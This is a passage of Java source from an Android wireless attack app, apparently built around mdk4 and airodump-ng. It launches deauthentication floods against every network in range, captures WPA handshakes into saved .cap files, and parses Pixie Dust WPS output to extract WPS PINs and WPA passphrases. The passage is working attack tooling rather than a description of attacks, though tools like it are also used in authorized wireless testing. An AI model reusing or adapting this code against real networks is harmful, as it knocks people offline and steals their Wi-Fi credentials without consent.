                                if (device[0] && !devices.contains(line.get(0)) && !line.get(0).equals("Station MAC") && !wifimacs.contains(line.get(0))) {
                                    devices.add(line.get(0));
                                }


                            }
                        }
                    }
                }, 0, 2500);
                String deauthIface = core.getDeauthInterface();
                if (!deauthIface.equals(capIface)) {
                    core.monitorManager.enableMonitorMode(deauthIface);
                    deauthIface = core.getDeauthInterface();
                }
                monitor.stage(AttackStage.DEAUTH, AttackStage.State.ACTIVE, "mdk4 on " + deauthIface);
                mdk4 = new AdvancedProcess(activity, context, "mdk4 " + deauthIface + " d", true) {
                    @Override
                    public void onFinished(ArrayList<String> outputList) {
                        core.toaster("Mdk4 stopped");
                        monitor.stage(AttackStage.DEAUTH, AttackStage.State.FAILED,
                                "mdk4 stopped — capture continues passively");
                    }

                    @Override
                    public void onNewLine(String line) {
                        monitor.mdk4(maskedLine(line));
                    }

                    @Override
                    public void onEvent(String line) {

                    }
                };

            } else if (monitorMode) {
                monitor.failStage(AttackStage.CAPTURE, "airodump-ng never wrote its CSV",
                        "Failed to start attack. Please try again.");
            }
        }).start();

        monitor.onStop(() -> {
            if (mdk4 != null) {
                mdk4.kill();
            }
            if (airodump != null) {
                airodump.kill();
            }
            try {
                csvReader.get().cancel();
            } catch (Exception e) {
                e.printStackTrace();
            }
            final int captured = hs.size();
            if (captured == 0) {
                monitor.finish(false, "No handshake captured");
            } else {
                monitor.stage(AttackStage.SAVE, AttackStage.State.ACTIVE);
            }
            new Thread(() -> {
                if (captured > 0) {
                    String strDate = new SimpleDateFormat("dd-MM_HH-mm", Locale.ENGLISH).format(new Date());
                    String dest = capturedDir + "/MassHS_" + captured + "_" + strDate + ".cap";
                    java.io.File src = newestCapture(hsDir, "handshakenow-");
                    boolean saved = false;
                    if (src != null) {
                        new java.io.File(capturedDir).mkdirs();
                        core.moveFile(src.getAbsolutePath(), dest);
                        saved = new java.io.File(dest).isFile();
                    }
                    if (saved) {
                        monitor.stage(AttackStage.SAVE, AttackStage.State.DONE, dest);
                        monitor.finish(true, totalSuccess[0] + " handshakes\n" + dest);
                    } else {
                        monitor.stage(AttackStage.SAVE, AttackStage.State.FAILED,
                                "Nothing to move out of the share");
                        monitor.finish(false, totalSuccess[0]
                                + " handshakes, but the capture file could not be saved — check the log");
                    }
                }
                core.monitorManager.disableMonitorMode(core.getHSInterface());
                core.monitorManager.disableMonitorMode(core.getDeauthInterface());
            }).start();
        });
    }

    public void runDeauth() {
        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.MASS_DEAUTH,
                "Every network in range", core.getDeauthInterface());
        monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE);
        new Thread(() -> {
            final String requestedIface = core.getDeauthInterface();
            monitor.metric(AttackMetric.IFACE, requestedIface);
            monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE, requestedIface);
            if (core.monitorManager.enableMonitorMode(requestedIface)) {
                final String monIface = core.getDeauthInterface();
                monitor.metric(AttackMetric.IFACE, monIface);
                monitor.stage(AttackStage.MONITOR, AttackStage.State.DONE, monIface);
                monitor.stage(AttackStage.INJECT, AttackStage.State.ACTIVE, "mdk4 deauth mode");
                mdk4 = new AdvancedProcess(activity, context, "mdk4 " + monIface + " d", true) {

                    @Override
                    public void onFinished(ArrayList<String> outputList) {
                        core.toaster("Mdk4 stopped");
                        monitor.finish(false, "Attack stopped");
                    }

                    @Override
                    public void onNewLine(String line) {
                        monitor.mdk4(maskedLine(line));
                    }

                    @Override
                    public void onEvent(String line) {

                    }
                };
            } else {
                core.toaster("Mdk4 stopped");
                monitor.failStage(AttackStage.MONITOR, "Interface refused monitor mode",
                        "Attack stopped, failed to start monitor mode");
            }
        }).start();

        monitor.onStop(() -> {
            if (mdk4 != null) {
                mdk4.kill();
            }
            if (airodump != null) {
                airodump.kill();

            }
            new Thread(() -> core.monitorManager.disableMonitorMode(core.getDeauthInterface())).start();
            monitor.finish(false, "Attack stopped");
        });
    }

    private String targetMeta(WiFINetwork network) {
        StringBuilder sb = new StringBuilder();
        sb.append(core.getBoolean("hide")
                ? Core.HIDDEN_MAC
                : String.valueOf(network.getMac()).toUpperCase(Locale.ROOT));
        if (network.getChannel() > 0) sb.append("  ch ").append(network.getChannel());
        sb.append(network.getIs5hhz() ? "  5 GHz" : "  2.4 GHz");
        sb.append("  ").append(Math.max(0, Math.min(100, 100 - network.getPower()))).append("%");
        String model = network.getModel();
        if (model != null && !model.isEmpty()) sb.append('\n').append(model);
        return sb.toString();
    }

    private String maskedLine(String line) {
        if (line == null || !core.getBoolean("hide")) return line;
        Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
        return m.find() ? line.replace(m.group(), Core.HIDDEN_MAC) : line;
    }

    private static java.io.File newestCapture(String dir, String prefix) {
        java.io.File[] caps = new java.io.File(dir)
                .listFiles((d, n) -> n.startsWith(prefix) && n.endsWith(".cap"));
        java.io.File newest = null;
        if (caps != null) {
            for (java.io.File f : caps) {
                if (newest == null || f.lastModified() > newest.lastModified()) newest = f;
            }
        }
        return newest;
    }

    private void restoreWpsInterface() {
        new Thread(() -> {
            String wpsIface = core.getWPSInterface();
            String hsIface = core.getHSInterface();
            if (core.isRootless()) {
                if (wpsIface != null && wpsIface.length() > 0) {
                    core.customChrootCommand("ip link set " + wpsIface + " up", true);
                }
                if (hsIface != null && hsIface.length() > 0 && !hsIface.equals(wpsIface)) {
                    core.customChrootCommand("ip link set " + hsIface + " up", true);
                }
                return;
            }
            if (wpsIface != null && wpsIface.length() > 0) {
                core.customCommand("ifconfig " + wpsIface + " up", true);
            }
            if (hsIface != null && hsIface.length() > 0 && !hsIface.equals(wpsIface)) {
                core.customCommand("ifconfig " + hsIface + " up", true);
            }
            if (core.isPixieIfaceDown()) {
                core.customCommand("svc wifi enable", true);
            }
        }).start();
    }

    public WiFINetwork pixieParse(ArrayList<String> out) {
        String pin;
        String pass;

        WiFINetwork back = new WiFINetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS pin:")) {
                pin = s.replace("[+] WPS pin: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }
            if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }
            if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            }
        }
        return back;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        if (img != null) {
            try {
                img.cancelAnimation();
            } catch (Exception ignored) {
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        alive.set(false);
        cancelBackgroundWork();
    }

    private void cancelBackgroundWork() {
        try {
            if (scanThread != null) {
                scanThread.interrupt();
            }
        } catch (Exception ignored) {
        }
        try {
            if (attackThread != null) {
                attackThread.interrupt();
            }
        } catch (Exception ignored) {
        }
        try {
            if (pixieProcess != null) {
                pixieProcess.kill();
            }
        } catch (Exception ignored) {
        }
        try {
            if (mdk4 != null) {
                mdk4.kill();
            }
        } catch (Exception ignored) {
        }
        try {
            if (airodump != null) {
                airodump.kill();
            }
        } catch (Exception ignored) {
        }
    }
}
